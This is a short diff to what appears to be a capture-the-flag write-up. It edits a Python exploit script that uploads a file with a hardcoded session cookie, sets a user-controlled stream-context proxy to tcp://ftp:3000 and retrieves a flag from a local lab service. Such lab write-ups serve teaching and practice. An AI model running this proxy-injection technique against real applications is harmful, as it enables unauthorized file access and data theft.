@@ -97,7 +97,6 @@ The application uses session settings to create a stream context, which is user-
 
 ```python
 import requests
-import json
 import urllib.parse
 
 url = "http://localhost:8080"
@@ -108,7 +107,7 @@ file = {'file': (data, "")}
 sess = {"PHPSESSID": "21n3bc7elm25b7r7lml2r7neq1"}
 
 if requests.post(url, files=file, cookies=sess).status_code == 200:
-    conf = {'settings': json.dumps({'proxy': 'tcp://ftp:3000'})}
+    conf = {'settings': '{"proxy": "tcp://ftp:3000"}'}
     if requests.post(url, data=conf, cookies=sess).status_code == 200:
         res = requests.get(url + f"?filename={urllib.parse.quote(name)}", cookies=sess)
         print(f"Flag: {res.content}")
